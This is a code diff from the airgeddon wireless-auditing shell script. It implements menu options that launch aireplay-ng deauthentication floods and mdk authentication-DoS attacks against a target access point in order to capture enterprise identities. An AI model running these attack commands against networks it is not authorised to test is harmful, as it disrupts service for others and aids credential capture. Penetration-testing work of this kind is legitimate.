@@ -13504,7 +13504,7 @@ function dos_info_gathering_enterprise_menu() {
 				rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 				echo "${bssid}" > "${tmpdir}bl.txt"
 				recalculate_windows_sizes
-				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack" "active"
+				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
 				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 					get_tmux_process_id "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}"
 					processidattack="${global_process_pid}"
@@ -13515,10 +13515,40 @@ function dos_info_gathering_enterprise_menu() {
 			fi
 		;;
 		2)
-			: #TODO pending
+			if contains_element "${attack_info_gathering_enterprise_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				ask_timeout "capture_identities"
+				identity_capture_window
+				${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+				recalculate_windows_sizes
+				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
+				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}"
+					processidattack="${global_process_pid}"
+					global_process_pid=""
+				fi
+				sleeptimeattack=12
+				launch_identity_capture
+			fi
 		;;
 		3)
-			: #TODO pending
+			if contains_element "${attack_info_gathering_enterprise_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				ask_timeout "capture_identities"
+				identity_capture_window
+				${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+				recalculate_windows_sizes
+				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack"
+				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "${mdk_command} ${interface} a -a ${bssid} -m"
+					processidattack="${global_process_pid}"
+					global_process_pid=""
+				fi
+				sleeptimeattack=12
+				launch_identity_capture
+			fi
 		;;
 		*)
 			invalid_menu_option
